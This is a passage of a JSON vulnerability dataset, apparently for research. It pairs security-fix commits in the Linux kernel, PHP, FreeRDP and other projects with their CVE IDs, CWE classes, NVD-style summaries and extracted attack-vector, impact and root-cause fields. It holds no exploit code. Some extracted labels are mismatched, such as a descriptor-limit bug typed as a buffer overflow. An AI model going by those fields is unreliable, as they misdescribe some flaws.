previously added an integer overflow check here but looking at it now , it 's still buggy","Vulnerability Type":"insufficient memory allocation","Attack Vector":"via a crafted sndrv _ compress _ set _ params ioctl call","Impact":"cause a denial of service ( insufficient memory allocation ) or possibly have unspecified other impact","Root Cause":"does not properly check for an integer overflow","Attack Type":"local attacker"},{"commit_id":"4efbc454ba68def5ef285b26ebfcfdb605b52755","cve_id":"CVE-2014-9903","cwe_id":"CWE-200","commit_message":"sched: Fix information leak in sys_sched_getattr()\n\nWe're copying the on-stack structure to userspace, but forgot to give\nthe right number of bytes to copy. This allows the calling process to\nobtain up to PAGE_SIZE bytes from the stack (and possibly adjacent\nkernel memory).\n\nThis fix copies only as much as we actually have on the stack\n(attr->size defaults to the size of the struct) and leaves the rest of\nthe userspace-provided buffer untouched.\n\nFound using kmemcheck + trinity.\n\nFixes: d50dde5a10f30 (\"sched: Add new scheduler syscalls to support an extended scheduling parameters ABI\")\nCc: Dario Faggioli <raistlin@linux.it>\nCc: Juri Lelli <juri.lelli@gmail.com>\nCc: Ingo Molnar <mingo@kernel.org>\nSigned-off-by: Vegard Nossum <vegard.nossum@oracle.com>\nSigned-off-by: Peter Zijlstra <peterz@infradead.org>\nLink: http:\/\/lkml.kernel.org\/r\/1392585857-10725-1-git-send-email-vegard.nossum@oracle.com\nSigned-off-by: Thomas Gleixner <tglx@linutronix.de>","summary":"The sched_read_attr function in kernel\/sched\/core.c in the Linux kernel 3.14-rc before 3.14-rc4 uses an incorrect size, which allows local users to obtain sensitive information from kernel stack memory via a crafted sched_getattr system call.","commit_message_1":"fix information leak in sys_sched_getattr ( ) we 're copying the on-stack structure to userspace , but forgot to give the right number of byte to copy","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted sched _ getattr system call","Impact":"obtain sensitive information from kernel stack memory","Root Cause":"uses an incorrect size","Attack Type":"local attacker"},{"commit_id":"c88e739b1fad662240e99ecbd0bdaac871717987","cve_id":"CVE-2014-9895","cwe_id":"CWE-200","commit_message":"[media] media: info leak in __media_device_enum_links()\n\nThese structs have holes and reserved struct members which aren't\ncleared.  I've added a memset() so we don't leak stack information.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nSigned-off-by: Laurent Pinchart <laurent.pinchart@ideasonboard.com>\nSigned-off-by: Mauro Carvalho Chehab <mchehab@redhat.com>","summary":"drivers\/media\/media-device.c in the Linux kernel before 3.11, as used in Android before 2016-08-05 on Nexus 5 and 7 (2013) devices, does not properly initialize certain data structures, which allows local users to obtain sensitive information via a crafted application, aka Android internal bug 28750150 and Qualcomm internal bug CR570757, a different vulnerability than CVE-2014-1739.","commit_message_1":"info leak in __media_device_enum_links ( ) these structs have hole and reserved struct member which are n't cleared","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted application , aka android internal bug 28750150 and qualcomm internal bug cr570757 , a different vulnerability than cve - 2014 - 1739 .","Impact":"obtain sensitive information","Root Cause":"does not properly initialize certain data structures","Attack Type":"local attacker"},{"commit_id":"0ea1ec713f04bdfac343c9702b21cd3a7c711826","cve_id":"CVE-2014-9888","cwe_id":"CWE-264","commit_message":"ARM: dma-mapping: don't allow DMA mappings to be marked executable\n\nDMA mapping permissions were being derived from pgprot_kernel directly\nwithout using PAGE_KERNEL.  This causes them to be marked with executable\npermission, which is not what we want.  Fix this.\n\nSigned-off-by: Russell King <rmk+kernel@arm.linux.org.uk>","summary":"arch\/arm\/mm\/dma-mapping.c in the Linux kernel before 3.13 on ARM platforms, as used in Android before 2016-08-05 on Nexus 5 and 7 (2013) devices, does not prevent executable DMA mappings, which might allow local users to gain privileges via a crafted application, aka Android internal bug 28803642 and Qualcomm internal bug CR642735.","commit_message_1":"dma-mapping : do n't allow dma mapping to be marked executable dma mapping permission were being derived from pgprot_kernel directly without using page_kernel","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application , aka android internal bug 28803642 and qualcomm internal bug cr642735","Impact":"gain privileges","Root Cause":"does not prevent executable dma mappings","Attack Type":"local attacker"},{"commit_id":"a4780adeefd042482f624f5e0d577bf9cdcbb760","cve_id":"CVE-2014-9870","cwe_id":"CWE-264","commit_message":"ARM: 7735\/2: Preserve the user r\/w register TPIDRURW on context switch and fork\n\nSince commit 6a1c53124aa1 the user writeable TLS register was zeroed to\nprevent it from being used as a covert channel between two tasks.\n\nThere are more and more applications coming to Windows RT,\nWine could support them, but mostly they expect to have\nthe thread environment block (TEB) in TPIDRURW.\n\nThis patch preserves that register per thread instead of clearing it.\nUnlike the TPIDRURO, which is already switched, the TPIDRURW\ncan be updated from userspace so needs careful treatment in the case that we\nmodify TPIDRURW and call fork(). To avoid this we must always read\nTPIDRURW in copy_thread.\n\nSigned-off-by: Andr\u00e9 Hentschel <nerv@dawncrow.de>\nSigned-off-by: Will Deacon <will.deacon@arm.com>\nSigned-off-by: Jonathan Austin <jonathan.austin@arm.com>\nSigned-off-by: Russell King <rmk+kernel@arm.linux.org.uk>","summary":"The Linux kernel before 3.11 on ARM platforms, as used in Android before 2016-08-05 on Nexus 5 and 7 (2013) devices, does not properly consider user-space access to the TPIDRURW register, which allows local users to gain privileges via a crafted application, aka Android internal bug 28749743 and Qualcomm internal bug CR561044.","commit_message_1":"<number>\/<number> : preserve the user r\/w register tpidrurw on context switch and fork since commit 6a1c53124aa1 the user writeable tl register wa zeroed to prevent it from being used a a covert channel between two task","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted application , aka android internal bug 28749743 and qualcomm internal bug cr561044","Impact":"gain privileges","Root Cause":"does not properly consider user - space access to the tpidrurw register","Attack Type":"local attacker"},{"commit_id":"5a0fdfada3a2aa50d7b947a2e958bf00cbe0d830","cve_id":"CVE-2014-9803","cwe_id":"CWE-19","commit_message":"Revert \"arm64: Introduce execute-only page access permissions\"\n\nThis reverts commit bc07c2c6e9ed125d362af0214b6313dca180cb08.\n\nWhile the aim is increased security for --x memory maps, it does not\nprotect against kernel level reads. Until SECCOMP is implemented for\narm64, revert this patch to avoid giving a false idea of execute-only\nmappings.\n\nSigned-off-by: Catalin Marinas <catalin.marinas@arm.com>","summary":"arch\/arm64\/include\/asm\/pgtable.h in the Linux kernel before 3.15-rc5-next-20140519, as used in Android before 2016-07-05 on Nexus 5X and 6P devices, mishandles execute-only pages, which allows attackers to gain privileges via a crafted application, aka Android internal bug 28557020.","commit_message_1":"introduce execute-only page access permission '' this reverts commit bc07c2c6e9ed125d362af0214b6313dca180cb08","Vulnerability Type":"Data Processing Errors","Attack Vector":"via a crafted application , aka android internal bug 28557020","Impact":"gain privileges","Root Cause":"caused by an error when handling execute-only pages","Attack Type":"attacker"},{"commit_id":"c597156adc60a45b5f827793cd420945f47bc03b","cve_id":"CVE-2014-9773","cwe_id":"CWE-284","commit_message":"chanserv\/flags: make Anope FLAGS compatibility an option\n\nPreviously, ChanServ FLAGS behavior could be modified by registering or\ndropping the keyword nicks \"LIST\", \"CLEAR\", and \"MODIFY\".\nNow, a configuration option is available that when turned on (default),\ndisables registration of these keyword nicks and enables this\ncompatibility feature. When turned off, registration of these keyword\nnicks is possible, and compatibility to Anope's FLAGS command is\ndisabled.\n\nFixes atheme\/atheme#397","summary":"modules\/chanserv\/flags.c in Atheme before 7.2.7 allows remote attackers to modify the Anope FLAGS behavior by registering and dropping the (1) LIST, (2) CLEAR, or (3) MODIFY keyword nicks.","commit_message_1":"make anope flag compatibility an option previously , chanserv flag behavior could be modified by registering or dropping the keyword nick `` list '' , `` clear '' , and `` modify ''","Vulnerability Type":"Improper Access Control","Attack Vector":"by registering and dropping the ( 1 ) list , ( 2 ) clear , or ( 3 ) modify keyword nicks","Impact":"modify the anope flags behavior","Root Cause":"caused by the failure to restrict registration of configuration options","Attack Type":"remote attacker"},{"commit_id":"65c95a01541dd2fbc9c978ac53bed235b5376686","cve_id":"CVE-2014-9767","cwe_id":"CWE-22","commit_message":"ZipArchive::extractTo bug 70350\n\nSummary:Don't allow upward directory traversal when extracting zip archive files.\n\nFiles in zip files with `..` or starting at main root `\/` should be normalized\nto something where the file being extracted winds up within the directory or\na subdirectory where the actual extraction is taking place.\n\nhttp:\/\/git.php.net\/?p=php-src.git;a=commit;h=f9c2bf73adb2ede0a486b0db466c264f2b27e0bb\n\nReviewed By: FBNeal\n\nDifferential Revision: D2798452\n\nfb-gh-sync-id: 844549c93e011d1e991bb322bf85822246b04e30\nshipit-source-id: 844549c93e011d1e991bb322bf85822246b04e30","summary":"Directory traversal vulnerability in the ZipArchive::extractTo function in ext\/zip\/php_zip.c in PHP before 5.4.45, 5.5.x before 5.5.29, and 5.6.x before 5.6.13 and ext\/zip\/ext_zip.cpp in HHVM before 3.12.1 allows remote attackers to create arbitrary empty directories via a crafted ZIP archive.","commit_message_1":"bug <number> summary : do n't allow upward directory traversal when extracting zip archive file","Vulnerability Type":"Path Traversal","Attack Vector":"via a crafted zip archive","Impact":"create arbitrary empty directories","Root Cause":"send a specially-crafted URL request to ZipArchive::extractTo containing directory traversal sequences","Attack Type":"remote attacker"},{"commit_id":"ef93ff74203e030073b898c05e8b4860b5d09ef2","cve_id":"CVE-2014-9765","cwe_id":"CWE-119","commit_message":"Add appheader tests; fix buffer overflow in main_get_appheader","summary":"Buffer overflow in the main_get_appheader function in xdelta3-main.h in xdelta3 before 3.0.9 allows remote attackers to execute arbitrary code via a crafted input file.","commit_message_1":"add appheader test ; fix buffer overflow in main_get_appheader","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted input file","Impact":"execute arbitrary code","Root Cause":"caused by improper bounds checking by main_get_appheader function","Attack Type":"remote attacker"},{"commit_id":"ce07d891a0891d3c0d0c2d73d577490486b809e1","cve_id":"CVE-2014-9717","cwe_id":"CWE-284","commit_message":"mnt: Honor MNT_LOCKED when detaching mounts\n\nModify umount(MNT_DETACH) to keep mounts in the hash table that are\nlocked to their parent mounts, when the parent is lazily unmounted.\n\nIn mntput_no_expire detach the children from the hash table, depending\non mnt_pin_kill in cleanup_mnt to decrement the mnt_count of the children.\n\nIn __detach_mounts if there are any mounts that have been unmounted\nbut still are on the list of mounts of a mountpoint, remove their\nchildren from the mount hash table and those children to the unmounted\nlist so they won't linger potentially indefinitely waiting for their\nfinal mntput, now that the mounts serve no purpose.\n\nCc: stable@vger.kernel.org\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>","summary":"fs\/namespace.c in the Linux kernel before 4.0.2 processes MNT_DETACH umount2 system calls without verifying that the MNT_LOCKED flag is unset, which allows local users to bypass intended access restrictions and navigate to filesystem locations beneath a mount by calling umount2 within a user namespace.","commit_message_1":"honor mnt_locked when detaching mount modify umount ( mnt_detach ) to keep mount in the hash table that are locked to their parent mount , when the parent is lazily unmounted","Vulnerability Type":"Improper Access Control","Attack Vector":"by calling umount2 within a user namespace","Impact":"bypass intended access restrictions and navigate to filesystem locations beneath a mount","Root Cause":"caused by the use of user namespaces to circumvent MNT_LOCKED","Attack Type":"local attacker"},{"commit_id":"4f65a3e4eedaffa1efcf9ee1eb08f0b504fbc31a","cve_id":"CVE-2013-7456","cwe_id":"CWE-125","commit_message":"Fixed memory overrun bug in gdImageScaleTwoPass\n\n_gdContributionsCalc would compute a window size and then adjust\nthe left and right positions of the window to make a window within\nthat size.  However, it was storing the values in the struct *before*\nit made the adjustment.  This change fixes that.","summary":"gd_interpolation.c in the GD Graphics Library (aka libgd) before 2.1.1, as used in PHP before 5.5.36, 5.6.x before 5.6.22, and 7.x before 7.0.7, allows remote attackers to cause a denial of service (out-of-bounds read) or possibly have unspecified other impact via a crafted image that is mishandled by the imagescale function.","commit_message_1":"fixed memory overrun bug in gdimagescaletwopass _gdcontributionscalc would compute a window size and then adjust the left and right position of the window to make a window within that size","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted image that is mishandled by the imagescale function","Impact":"cause a denial of service ( out - of - bounds read ) or possibly have unspecified other impact","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"fefaaa43c382eee632ea3ad0cfa915335140e1db","cve_id":"CVE-2013-7455","cwe_id":null,"commit_message":"Fix a double free on error recovering","summary":"Double free vulnerability in the DefaultICCintents function in cmscnvrt.c in liblcms2 in Little CMS 2.x before 2.6 allows remote attackers to execute arbitrary code via a malformed ICC profile that triggers an error in the default intent handler.","commit_message_1":"fix a double free on error recovering","Vulnerability Type":"double free","Attack Vector":"via a malformed icc profile that triggers an error in the default intent handler","Impact":"execute arbitrary code","Root Cause":"caused by a double-free error","Attack Type":"remote attacker"},{"commit_id":"c9b63f7f9be01692b03fa15275135a4910a7e02d","cve_id":"CVE-2013-7449","cwe_id":"CWE-310","commit_message":"ssl: Validate hostnames\n\nCloses #524","summary":"The ssl_do_connect function in common\/server.c in HexChat before 2.10.2, XChat, and XChat-GNOME does not verify that the server hostname matches a domain name in the X.509 certificate, which allows man-in-the-middle attackers to spoof SSL servers via an arbitrary valid certificate.","commit_message_1":"ssl : validate hostnames","Vulnerability Type":"Cryptographic Issues","Attack Vector":"via an arbitrary valid certificate","Impact":"spoof ssl servers","Root Cause":"does not verify that the server hostname matches a domain name","Attack Type":"remote attacker"},{"commit_id":"5e5c796617e1712905dc5462b94bd5e6c08d15ea","cve_id":"CVE-2013-7448","cwe_id":"CWE-22","commit_message":"page_name_is_good function","summary":"Directory traversal vulnerability in wiki.c in didiwiki allows remote attackers to read arbitrary files via the page parameter to api\/page\/get.","commit_message_1":"page_name_is_good function","Vulnerability Type":"Path Traversal","Attack Vector":"via the page parameter to api \/ page \/ get .","Impact":"read arbitrary files","Root Cause":"send a specially-crafted URL request containing \"dot dot\" sequences (\/..\/)","Attack Type":"remote attacker"},{"commit_id":"712f4aad406bb1ed67f3f98d04c044191f0ff593","cve_id":"CVE-2013-4312","cwe_id":"CWE-119","commit_message":"unix: properly account for FDs passed over unix sockets\n\nIt is possible for a process to allocate and accumulate far more FDs than\nthe process' limit by sending them over a unix socket then closing them\nto keep the process' fd count low.\n\nThis change addresses this problem by keeping track of the number of FDs\nin flight per user and preventing non-privileged processes from having\nmore FDs in flight than their configured FD limit.\n\nReported-by: socketpair@gmail.com\nReported-by: Tetsuo Handa <penguin-kernel@I-love.SAKURA.ne.jp>\nMitigates: CVE-2013-4312 (Linux 2.0+)\nSuggested-by: Linus Torvalds <torvalds@linux-foundation.org>\nAcked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>\nSigned-off-by: Willy Tarreau <w@1wt.eu>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The Linux kernel before 4.4.1 allows local users to bypass file-descriptor limits and cause a denial of service (memory consumption) by sending each descriptor over a UNIX socket before closing it, related to net\/unix\/af_unix.c and net\/unix\/garbage.c.","commit_message_1":"properly account for fds passed over unix socket it is possible for a process to allocate and accumulate far more fds than the process ' limit by sending them over a unix socket then closing them to keep the process ' fd count low","Vulnerability Type":"buffer overflow","Attack Vector":"by sending each descriptor over a unix socket before closing it , related to net \/ unix \/ af _ unix . c and net \/ unix \/ garbage . c","Impact":"bypass file - descriptor limits and cause a denial of service ( memory consumption )","Root Cause":"By sending specially-crafted file descriptors over a UNIX socket","Attack Type":"local attacker"},{"commit_id":"0773bb9303d24473fe1185d85a424dfe159aff53","cve_id":"CVE-2013-4119","cwe_id":"CWE-476","commit_message":"nla: invalidate sec handle after creation\n\nIf sec pointer isn't invalidated after creation it is not possible\nto check if the upper and lower pointers are valid.\n\nThis fixes a segfault in the server part if the client disconnects before\nthe authentication was finished.","summary":"FreeRDP before 1.1.0-beta+2013071101 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) by disconnecting before authentication has finished.","commit_message_1":"invalidate sec handle after creation if sec pointer is n't invalidated after creation it is not possible to check if the upper and lower pointer are valid","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by disconnecting before authentication has finished","Impact":"cause a denial of service ( pointer dereference and application crash )","Root Cause":"An unspecified error","Attack Type":"remote attacker"},{"commit_id":"7d58aac24fe20ffaad7bd9b40c9ddf457c1b06e7","cve_id":"CVE-2013-4118","cwe_id":"CWE-476","commit_message":"security: add a NULL pointer check to fix a server crash.","summary":"FreeRDP before 1.1.0-beta1 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via unspecified vectors.","commit_message_1":"add a null pointer check to fix a server crash","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via unspecified vectors","Impact":"cause a denial of service ( pointer dereference and application crash )","Root Cause":"An unspecified error","Attack Type":"remote attacker"},{"commit_id":"82981930125abfd39d7c8378a9cfdf5e1be2002b","cve_id":"CVE-2012-6704","cwe_id":"CWE-119","commit_message":"net: cleanups in sock_setsockopt()\n\nUse min_t()\/max_t() macros, reformat two comments, use !!test_bit() to\nmatch !!sock_flag()\n\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The sock_setsockopt function in net\/core\/sock.c in the Linux kernel before 3.5 mishandles negative values of sk_sndbuf and sk_rcvbuf, which allows local users to cause a denial of service (memory corruption and system crash) or possibly have unspecified other impact by leveraging the CAP_NET_ADMIN capability for a crafted setsockopt system call with the (1) SO_SNDBUF or (2) SO_RCVBUF option.","commit_message_1":"cleanup in sock_setsockopt ( ) use min_t ( ) \/max_t ( ) macro , reformat two comment , use ! ! test_bit ( ) to match ! ! sock_flag ( )","Vulnerability Type":"buffer overflow","Attack Vector":"by leveraging the cap _ net _ admin capability for a crafted setsockopt system call with the ( 1 ) so _ sndbuf or ( 2 ) so _ rcvbuf option","Impact":"cause a denial of service ( memory corruption and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"b35cc8225845112a616e3a2266d2fde5ab13d3ab","cve_id":"CVE-2012-6703","cwe_id":null,"commit_message":"ALSA: compress_core: integer overflow in snd_compr_allocate_buffer()\n\nThese are 32 bit values that come from the user, we need to check for\ninteger overflows or we could end up allocating a smaller buffer than\nexpected.\n\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"Integer overflow in the snd_compr_allocate_buffer function in sound\/core\/compress_offload.c in the ALSA subsystem in the Linux kernel before 3.6-rc6-next-20120917 allows local users to cause a denial of service (insufficient memory allocation) or possibly have unspecified other impact via a crafted SNDRV_COMPRESS_SET_PARAMS ioctl call.","commit_message_1":"compress_core : integer overflow in snd_compr_allocate_buffer ( ) these are <number> bit value that come from the user , we need to check for integer overflow or we could end up allocating a smaller buffer than expected","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted sndrv _ compress _ set _ params ioctl call","Impact":"cause a denial of service ( insufficient memory allocation ) or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"local attacker"},{"commit_id":"a70b52ec1aaeaf60f4739edb1b422827cb6f3893","cve_id":"CVE-2012-6701","cwe_id":null,"commit_message":"vfs: make AIO use the proper rw_verify_area() area helpers\n\nWe had for some reason overlooked the AIO interface, and it didn't use\nthe proper rw_verify_area() helper function that checks (for example)\nmandatory locking on the file, and that the size of the access doesn't\ncause us to overflow the provided offset limits etc.\n\nInstead, AIO did just the security_file_permission() thing (that\nrw_verify_area() also does) directly.\n\nThis fixes it to do all the proper helper functions, which not only\nmeans that now mandatory file locking works with AIO too, we can\nactually remove lines of code.\n\nReported-by: Manish Honap <manish_honap_vit@yahoo.co.in>\nCc: stable@vger.kernel.org\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"Integer overflow in fs\/aio.c in the Linux kernel before 3.4.1 allows local users to cause a denial of service or possibly have unspecified other impact via a large AIO iovec.","commit_message_1":"make aio use the proper rw_verify_area ( ) area helper we had for some reason overlooked the aio interface , and it did n't use the proper rw_verify_area ( ) helper function that check ( for example ) mandatory locking on the file , and that the size of the access doe n't cause u to overflow the provided offset limit etc","Vulnerability Type":"integer overflow","Attack Vector":"via a large aio iovec","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an integer overflow when failing to use the proper rw_verify_area() helper function for checks by the AIO interface","Attack Type":"local attacker"},{"commit_id":"20e1db19db5d6b9e4e83021595eab0dc8f107bef","cve_id":"CVE-2012-6689","cwe_id":"CWE-284","commit_message":"netlink: fix possible spoofing from non-root processes\n\nNon-root user-space processes can send Netlink messages to other\nprocesses that are well-known for being subscribed to Netlink\nasynchronous notifications. This allows ilegitimate non-root\nprocess to send forged messages to Netlink subscribers.\n\nThe userspace process usually verifies the legitimate origin in\ntwo ways:\n\na) Socket credentials. If UID != 0, then the message comes from\n   some ilegitimate process and the message needs to be dropped.\n\nb) Netlink portID. In general, portID == 0 means that the origin\n   of the messages comes from the kernel. Thus, discarding any\n   message not coming from the kernel.\n\nHowever, ctnetlink sets the portID in event messages that has\nbeen triggered by some user-space process, eg. conntrack utility.\nSo other processes subscribed to ctnetlink events, eg. conntrackd,\nknow that the event was triggered by some user-space action.\n\nNeither of the two ways to discard ilegitimate messages coming\nfrom non-root processes can help for ctnetlink.\n\nThis patch adds capability validation in case that dst_pid is set\nin netlink_sendmsg(). This approach is aggressive since existing\napplications using any Netlink bus to deliver messages between\ntwo user-space processes will break. Note that the exception is\nNETLINK_USERSOCK, since it is reserved for netlink-to-netlink\nuserspace communication.\n\nStill, if anyone wants that his Netlink bus allows netlink-to-netlink\nuserspace, then they can set NL_NONROOT_SEND. However, by default,\nI don't think it makes sense to allow to use NETLINK_ROUTE to\ncommunicate two processes that are sending no matter what information\nthat is not related to link\/neighbouring\/routing. They should be using\nNETLINK_USERSOCK instead for that.\n\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"The netlink_sendmsg function in net\/netlink\/af_netlink.c in the Linux kernel before 3.5.5 does not validate the dst_pid field, which allows local users to have an unspecified impact by spoofing Netlink messages.","commit_message_1":"fix possible spoofing from non-root process non-root user-space process can send netlink message to other process that are well-known for being subscribed to netlink asynchronous notification","Vulnerability Type":"Improper Access Control","Attack Vector":"by spoofing netlink messages","Impact":"have an unspecified impact","Root Cause":"does not validate the dst _ pid field","Attack Type":"local attacker"},{"commit_id":"c290f8358acaeffd8e0c551ddcc24d1206143376","cve_id":"CVE-2011-5321","cwe_id":null,"commit_message":"TTY: drop driver reference in tty_open fail path\n\nWhen tty_driver_lookup_tty fails in tty_open, we forget to drop a\nreference to the tty driver. This was added by commit 4a2b5fddd5 (Move\ntty lookup\/reopen to caller).\n\nFix that by adding tty_driver_kref_put to the fail path.\n\nI will refactor the code later. This is for the ease of backporting to\nstable.\n\nIntroduced-in: v2.6.28-rc2\nSigned-off-by: Jiri Slaby <jslaby@suse.cz>\nCc: stable <stable@vger.kernel.org>\nCc: Alan Cox <alan@lxorguk.ukuu.org.uk>\nAcked-by: Sukadev Bhattiprolu <sukadev@linux.vnet.ibm.com>\nSigned-off-by: Greg Kroah-Hartman <gregkh@suse.de>","summary":"The tty_open function in drivers\/tty\/tty_io.c in the Linux kernel before 3.1.1 mishandles a driver-lookup failure, which allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via crafted access to a device file under the \/dev\/pts directory.","commit_message_1":"drop driver reference in tty_open fail path when tty_driver_lookup_tty fails in tty_open , we forget to drop a reference to the tty driver","Vulnerability Type":"NULL pointer dereference","Attack Vector":"via crafted access to a device file under the \/ dev \/ pts directory","Impact":"cause a denial of service ( pointer dereference and system crash ) or possibly have unspecified other impact","Root Cause":"caused by a NULL pointer dereference while accessing pseudo terminal device files","Attack Type":"local attacker"},{"commit_id":"124d3b7041f9a0ca7c43a6293e1cae4576c32fd5","cve_id":"CVE-2008-7316","cwe_id":"CWE-20","commit_message":"fix writev regression: pan hanging unkillable and un-straceable\n\nFrederik Himpe reported an unkillable and un-straceable pan process.\n\nZero length iovecs can go into an infinite loop in writev, because the\niovec iterator does not always advance over them.\n\nThe sequence required to trigger this is not trivial. I think it\nrequires that a zero-length iovec be followed by a non-zero-length iovec\nwhich causes a pagefault in the atomic usercopy. This causes the writev\ncode to drop back into single-segment copy mode, which then tries to\ncopy the 0 bytes of the zero-length iovec; a zero length copy looks like\na failure though, so it loops.\n\nPut a test into iov_iter_advance to catch zero-length iovecs. We could\njust put the test in the fallback path, but I feel it is more robust to\nskip over zero-length iovecs throughout the code (iovec iterator may be\nused in filesystems too, so it should be robust).\n\nSigned-off-by: Nick Piggin <npiggin@suse.de>\nSigned-off-by: Ingo Molnar <mingo@elte.hu>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>","summary":"mm\/filemap.c in the Linux kernel before 2.6.25 allows local users to cause a denial of service (infinite loop) via a writev system call that triggers an iovec of zero length, followed by a page fault for an iovec of nonzero length.","commit_message_1":"pan hanging unkillable and un-straceable frederik himpe reported an unkillable and un-straceable pan process","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a writev system call that triggers an iovec of zero length , followed by a page fault for an iovec of nonzero length","Impact":"cause a denial of service ( infinite loop )","Root Cause":"caused by an error","Attack Type":"local attacker"},{"commit_id":"ba3021b2c79b2fa9114f92790a99deb27a65b728","cve_id":"CVE-2017-1000380","cwe_id":"CWE-200","commit_message":"ALSA: timer: Fix missing queue indices reset at SNDRV_TIMER_IOCTL_SELECT\n\nsnd_timer_user_tselect() reallocates the queue buffer dynamically, but\nit forgot to reset its indices.  Since the read may happen\nconcurrently with ioctl and snd_timer_user_tselect() allocates the\nbuffer via kmalloc(), this may lead to the leak of uninitialized\nkernel-space data, as spotted via KMSAN:\n\n  BUG: KMSAN: use of unitialized memory in snd_timer_user_read+0x6c4\/0xa10\n  CPU: 0 PID: 1037 Comm: probe Not tainted 4.11.0-rc5+ #2739\n  Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01\/01\/2011\n  Call Trace:\n   __dump_stack lib\/dump_stack.c:16\n   dump_stack+0x143\/0x1b0 lib\/dump_stack.c:52\n   kmsan_report+0x12a\/0x180 mm\/kmsan\/kmsan.c:1007\n   kmsan_check_memory+0xc2\/0x140 mm\/kmsan\/kmsan.c:1086\n   copy_to_user .\/arch\/x86\/include\/asm\/uaccess.h:725\n   snd_timer_user_read+0x6c4\/0xa10 sound\/core\/timer.c:2004\n   do_loop_readv_writev fs\/read_write.c:716\n   __do_readv_writev+0x94c\/0x1380 fs\/read_write.c:864\n   do_readv_writev fs\/read_write.c:894\n   vfs_readv fs\/read_write.c:908\n   do_readv+0x52a\/0x5d0 fs\/read_write.c:934\n   SYSC_readv+0xb6\/0xd0 fs\/read_write.c:1021\n   SyS_readv+0x87\/0xb0 fs\/read_write.c:1018\n\nThis patch adds the missing reset of queue indices.  Together with the\nprevious fix for the ioctl\/read race, we cover the whole problem.\n\nReported-by: Alexander Potapenko <glider@google.com>\nTested-by: Alexander Potapenko <glider@google.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Takashi Iwai <tiwai@suse.de>","summary":"sound\/core\/timer.c in the Linux kernel before 4.11.5 is vulnerable to a data race in the ALSA \/dev\/snd\/timer driver resulting in local users being able to read information belonging to other users, i.e., uninitialized memory contents may be disclosed when a read and an ioctl happen at the same time.","commit_message_1":"timer : fix missing queue index reset at sndrv_timer_ioctl_select snd_timer_user_tselect ( ) reallocates the queue buffer dynamically , but it forgot to reset it index","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"uninitialized memory contents may be disclosed when a read and an ioctl happen at the same time","Impact":"obtain sensitive information","Root Cause":"caused by a flaw","Attack Type":"local attacker"},{"commit_id":"36ae3c0a36b7456432fedce38ae2f7bd3e01a563","cve_id":"CVE-2017-1000252","cwe_id":"CWE-20","commit_message":"KVM: Don't accept obviously wrong gsi values via KVM_IRQFD\n\nWe cannot add routes for gsi values >= KVM_MAX_IRQ_ROUTES -- see\nkvm_set_irq_routing(). Hence, there is no sense in accepting them\nvia KVM_IRQFD. Prevent them from entering the system in the first\nplace.\n\nSigned-off-by: Jan H. Sch\u00f6nherr <jschoenh@amazon.de>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>","summary":"The KVM subsystem in the Linux kernel through 4.13.3 allows guest OS users to cause a denial of service (assertion failure, and hypervisor hang or crash) via an out-of bounds guest_irq value, related to arch\/x86\/kvm\/vmx.c and virt\/kvm\/eventfd.c.","commit_message_1":"do n't accept obviously wrong gsi value via kvm_irqfd we can not add route for gsi value > = kvm_max_irq_routes -- see kvm_set_irq_routing ( )","Vulnerability Type":"Improper Input Validation","Attack Vector":"via an out - of bounds guest _ irq value , related to arch \/ x86 \/ kvm \/ vmx . c and virt \/ kvm \/ eventfd . c","Impact":"cause a denial of service ( assertion failure , and hypervisor hang or crash )","Root Cause":"caused by an assertion failure","Attack Type":"local attacker"},{"commit_id":"f2fcfcd670257236ebf2088bbdf26f6a8ef459fe","cve_id":"CVE-2017-1000251","cwe_id":"CWE-119","commit_message":"Bluetooth: Add configuration support for ERTM and Streaming mode\n\nAdd support to config_req and config_rsp to configure ERTM and Streaming\nmode. If the remote device specifies ERTM or Streaming mode, then the\nsame mode is proposed. Otherwise ERTM or Basic mode is used. And in case\nof a state 2 device, the remote device should propose the same mode. If\nnot, then the channel gets disconnected.\n\nSigned-off-by: Gustavo F. Padovan <gustavo@las.ic.unicamp.br>\nSigned-off-by: Marcel Holtmann <marcel@holtmann.org>","summary":"The native Bluetooth stack in the Linux Kernel (BlueZ), starting at the Linux kernel version 2.6.32 and up to and including 4.13.1, are vulnerable to a stack overflow vulnerability in the processing of L2CAP configuration responses resulting in Remote code execution in kernel space.","commit_message_1":"add configuration support for ertm and streaming mode add support to config_req and config_rsp to configure ertm and streaming mode","Vulnerability Type":"buffer overflow","Attack Vector":"By 